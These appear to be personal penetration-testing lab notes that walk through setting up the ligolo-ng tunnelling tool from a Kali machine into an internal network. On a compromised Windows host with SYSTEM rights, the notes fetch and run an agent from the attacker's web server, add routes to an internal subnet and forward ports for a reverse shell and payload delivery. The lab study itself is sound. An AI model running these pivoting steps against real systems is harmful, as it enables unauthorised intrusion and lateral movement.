https://github.com/nicocha30/ligolo-ng/releases/
┌──(kali㉿kali)-[~/ligolo]
└─$ cp /home/kali/Downloads/ligolo-ng_agent_0.7.1-alpha_linux_amd64.tar.gz .
                                                                                     
┌──(kali㉿kali)-[~/ligolo]
└─$ cp /home/kali/Downloads/ligolo-ng_agent_0.7.1-alpha_windows_amd64.zip . 
                                                                                     
┌──(kali㉿kali)-[~/ligolo]
└─$ cp /home/kali/Downloads/ligolo-ng_proxy_0.7.1-alpha_linux_amd64.tar.gz .
                                                                                     
┌──(kali㉿kali)-[~/ligolo]
└─$ ls
ligolo-ng_agent_0.7.1-alpha_linux_amd64.tar.gz
ligolo-ng_agent_0.7.1-alpha_windows_amd64.zip
ligolo-ng_proxy_0.7.1-alpha_linux_amd64.tar.gz
                                                                                     
┌──(kali㉿kali)-[~/ligolo]
└─$ unzip ligolo-ng_agent_0.7.1-alpha_windows_amd64.zip 
Archive:  ligolo-ng_agent_0.7.1-alpha_windows_amd64.zip
  inflating: LICENSE                 
  inflating: README.md               
  inflating: agent.exe 

  ┌──(kali㉿kali)-[~/ligolo]
└─$ mkdir liglinux    
                                                                                     
                                                                                     
┌──(kali㉿kali)-[~/ligolo]
└─$ cd liglinux   

┌──(kali㉿kali)-[~/ligolo]
└─$ tar -xvzf ligolo-ng_agent_0.7.1-alpha_linux_amd64.tar.gz -C liglinux
LICENSE
README.md
agent
                                                                                     
┌──(kali㉿kali)-[~/ligolo]
└─$ tar -xvzf ligolo-ng_proxy_0.7.1-alpha_linux_amd64.tar.gz -C liglinux 
LICENSE
README.md
proxy
                                                                                     
┌──(kali㉿kali)-[~/ligolo]
└─$ cd liglinux 
                                                                                     
┌──(kali㉿kali)-[~/ligolo/liglinux]
└─$ ls   
LICENSE  README.md  agent  proxy


┌──(kali㉿kali)-[~/ligolo/liglinux]
└─$ sudo ip tuntap add user kali mode tun ligolo
[sudo] password for kali: 
                                                                                     
┌──(kali㉿kali)-[~/ligolo/liglinux]
└─$ ip -br a
lo               UNKNOWN        127.0.0.1/8 ::1/128 
eth0             UP             10.0.2.15/24 fd00::a13c:32cf:ed62:e1dd/64 fd00::a00:27ff:fe73:cf9/64 fe80::a00:27ff:fe73:cf9/64 
docker0          DOWN           172.17.0.1/16 
br-fd4c74040a22  DOWN           172.18.0.1/16 
tun0             UNKNOWN        192.168.45.203/24 fe80::f4a4:4edc:9d1a:767a/64 
ligolo           DOWN           
                                                                                     
┌──(kali㉿kali)-[~/ligolo/liglinux]
└─$ sudo ip link set ligolo up                  
       
──(kali㉿kali)-[~/ligolo/liglinux]
└─$ ./proxy -selfcert
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
WARN[0000] Using self-signed certificates               
ERRO[0000] Certificate cache error: acme/autocert: certificate cache miss, returning a new certificate 
WARN[0000] TLS Certificate fingerprint for ligolo is: 1B034773F5A5C39E1CEC936B353E728D9B25E0C82CE71DCAF6A942F029443C8C 
INFO[0000] Listening on 0.0.0.0:11601                   
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _                                    
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/                                    
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ /                                     
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /                                      
        /____/                          /____/                                       
                                                                                     
  Made in France ♥            by @Nicocha30!                                         
  Version: 0.7.1-alpha                                                               
                                                                                     
ligolo-ng » INFO[0197] Agent joined.                                 name="NT AUTHORITY\\SYSTEM@MS01" remote="192.168.173.147:54569"


#on windows

PS C:\Users\Administrator> iwr -uri http://192.168.45.203:80/agent.exe -Outfile agent.exe
iwr -uri http://192.168.45.203:80/agent.exe -Outfile agent.exe
PS C:\Users\Administrator> ls
                                                       
PS C:\Users\Administrator> .\agent.exe -connect 192.168.45.203:11601 -ignore-cert  
.\agent.exe -connect 192.168.45.203:11601 -ignore-cert 
time="2024-11-30T11:16:56-08:00" level=warning msg="warning, certificate validation disabled"
time="2024-11-30T11:16:56-08:00" level=info msg="Connection established" addr="192.168.45.203:11601"

#Once it add, you get the session opened above.

#you can start by adding routes and addresses to the session and then starting it

[Agent : NT AUTHORITY\SYSTEM@MS01] » ifconfig
┌───────────────────────────────────────────────┐
│ Interface 0                                   │
├──────────────┬────────────────────────────────┤
│ Name         │ Ethernet0                      │
│ Hardware MAC │ 00:50:56:9e:2f:64              │
│ MTU          │ 1500                           │
│ Flags        │ up|broadcast|multicast|running │
│ IPv4 Address │ 192.168.173.147/24             │
└──────────────┴────────────────────────────────┘
┌───────────────────────────────────────────────┐
│ Interface 1                                   │
├──────────────┬────────────────────────────────┤
│ Name         │ Ethernet1                      │
│ Hardware MAC │ 00:50:56:9e:9f:46              │
│ MTU          │ 1500                           │
│ Flags        │ up|broadcast|multicast|running │
│ IPv4 Address │ 10.10.133.147/24               │
└──────────────┴────────────────────────────────┘
┌──────────────────────────────────────────────┐
│ Interface 2                                  │
├──────────────┬───────────────────────────────┤
│ Name         │ Loopback Pseudo-Interface 1   │
│ Hardware MAC │                               │
│ MTU          │ -1                            │
│ Flags        │ up|loopback|multicast|running │
│ IPv6 Address │ ::1/128                       │
│ IPv4 Address │ 127.0.0.1/8                   │
└──────────────┴───────────────────────────────┘

┌──(kali㉿kali)-[~/oscpb]
└─$ sudo ip route add 10.10.133.0/24 dev ligolo
                                                                                                                                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/oscpb]
└─$ ip route list
default via 10.0.2.2 dev eth0 proto dhcp src 10.0.2.15 metric 100 
10.0.2.0/24 dev eth0 proto kernel scope link src 10.0.2.15 metric 100 
10.10.133.0/24 dev ligolo scope link linkdown 
172.17.0.0/16 dev docker0 proto kernel scope link src 172.17.0.1 linkdown 
172.18.0.0/16 dev br-fd4c74040a22 proto kernel scope link src 172.18.0.1 linkdown 
192.168.45.0/24 dev tun0 proto kernel scope link src 192.168.45.203 
192.168.173.0/24 via 192.168.45.254 dev tun0 

[Agent : NT AUTHORITY\SYSTEM@MS01] » start
[Agent : NT AUTHORITY\SYSTEM@MS01] » INFO[0634] Starting tunnel to NT AUTHORITY\SYSTEM@MS01  
[Agent : NT AUTHORITY\SYSTEM@MS01] » 

#You can make commands to the internal IPs to confrim setup. (Did the confirmation by running netexec)

Adding portforwardings

[Agent : NT AUTHORITY\SYSTEM@MS01] » listener_list
┌────────────────────────────────────────────────────────────────────────────────┐
│ Active listeners                                                               │
├───┬───────┬─────────┬────────────────────────┬────────────────────────┬────────┤
│ # │ AGENT │ NETWORK │ AGENT LISTENER ADDRESS │ PROXY REDIRECT ADDRESS │ STATUS │
├───┼───────┼─────────┼────────────────────────┼────────────────────────┼────────┤
└───┴───────┴─────────┴────────────────────────┴────────────────────────┴────────┘
[Agent : NT AUTHORITY\SYSTEM@MS01] » listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444   (For revers shell)
INFO[1252] Listener 0 created on remote agent!          
[Agent : NT AUTHORITY\SYSTEM@MS01] » listener_list
┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│ Active listeners                                                                                                                                                 │
├───┬─────────────────────────────────────────────────────────────────────────────────────────┬─────────┬────────────────────────┬────────────────────────┬────────┤
│ # │ AGENT                                                                                   │ NETWORK │ AGENT LISTENER ADDRESS │ PROXY REDIRECT ADDRESS │ STATUS │
├───┼─────────────────────────────────────────────────────────────────────────────────────────┼─────────┼────────────────────────┼────────────────────────┼────────┤
│ 0 │ NT AUTHORITY\SYSTEM@MS01 - 192.168.173.147:54569 - 1607b1bf-9932-4a55-a383-1a8f04f02d7e │ tcp     │ 0.0.0.0:1234           │ 127.0.0.1:4444         │ Online │
└───┴─────────────────────────────────────────────────────────────────────────────────────────┴─────────┴────────────────────────┴────────────────────────┴────────┘
[Agent : NT AUTHORITY\SYSTEM@MS01] » listener_add --addr 0.0.0.0:1235 --to 127.0.0.1:80   (To my kali webserver)
INFO[1356] Listener 1 created on remote agent!          
[Agent : NT AUTHORITY\SYSTEM@MS01] » listener_list
┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│ Active listeners                                                                                                                                                 │
├───┬─────────────────────────────────────────────────────────────────────────────────────────┬─────────┬────────────────────────┬────────────────────────┬────────┤
│ # │ AGENT                                                                                   │ NETWORK │ AGENT LISTENER ADDRESS │ PROXY REDIRECT ADDRESS │ STATUS │
├───┼─────────────────────────────────────────────────────────────────────────────────────────┼─────────┼────────────────────────┼────────────────────────┼────────┤
│ 0 │ NT AUTHORITY\SYSTEM@MS01 - 192.168.173.147:54569 - 1607b1bf-9932-4a55-a383-1a8f04f02d7e │ tcp     │ 0.0.0.0:1234           │ 127.0.0.1:4444         │ Online │
│ 1 │ NT AUTHORITY\SYSTEM@MS01 - 192.168.173.147:54569 - 1607b1bf-9932-4a55-a383-1a8f04f02d7e │ tcp     │ 0.0.0.0:1235           │ 127.0.0.1:80           │ Online │
└───┴───────────────────────────────────

This means that <ms01 address>:1234 will point to port 4444 of our kali
                <ms01 address>:1235 will point to port 80 of our kali which is python 3 webserver we started in our kali


